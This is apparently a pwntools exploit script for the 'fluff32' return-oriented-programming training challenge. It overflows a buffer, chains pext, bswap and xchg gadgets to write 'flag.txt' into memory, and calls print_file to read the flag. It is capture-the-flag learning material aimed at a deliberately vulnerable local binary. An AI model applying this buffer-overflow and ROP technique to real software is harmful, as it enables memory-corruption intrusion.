from pwn import *

BINARY = "./fluff32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

"""
0x8048543    mov     eax, ebp
0x8048545    mov     ebx, 0B0BABABAh
; pext <DESTINATION>, <SOURCE>, <MASK>
0x804854A    pext    edx, ebx, eax
0x804854F    mov     eax, 0DEADBEEFh
0x8048554    ret
------------------------------------------
0x8048555    xchg    dl, [ecx]
0x8048557    ret
------------------------------------------
0x8048558    pop     ecx
0x8048559    bswap   ecx
0x804855B    ret
"""

def rev(n):
    """
    Dirty method to reverse bytes order
    example: 0x0804A018 --> 0x18A00408
    """
    n = str(hex(n))
    if len(n) % 2 != 0:
        n = "0x0" + n[2:]
    
    value = n[8:10] + n[6:8] + n[4:6] + n[2:4]
    return int(value, 16)


data_adr          = 0x0804A018
pop_ecx_bswap_ecx = p32(0x8048558)
xchg_dl_ptr_ecx   = p32(0x8048555)
pext_gadget       = p32(0x8048543)
pop_ebp_ret       = p32(0x080485bb) # pop ebp ; ret

flag = [0x4B4B, 0x6DD, 0x5D46, 0x4B5A, 0x5DB, 0x4ACD, 0x5AC5, 0x4ACD]

rop = b"A" * 44

for i in range(8):
    rop += pop_ebp_ret
    rop += p32(flag[i])
    rop += pext_gadget

    rop += pop_ecx_bswap_ecx
    rop += p32(rev(data_adr + i))
    rop += xchg_dl_ptr_ecx    

# Calling print_file('flag.txt')
rop += p32(ELF.symbols['print_file'])
rop += b"BBBB"
rop += p32(data_adr)

#pause() # pause the execution to observe what's going on via a debugger : gdb -p <pid>
p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
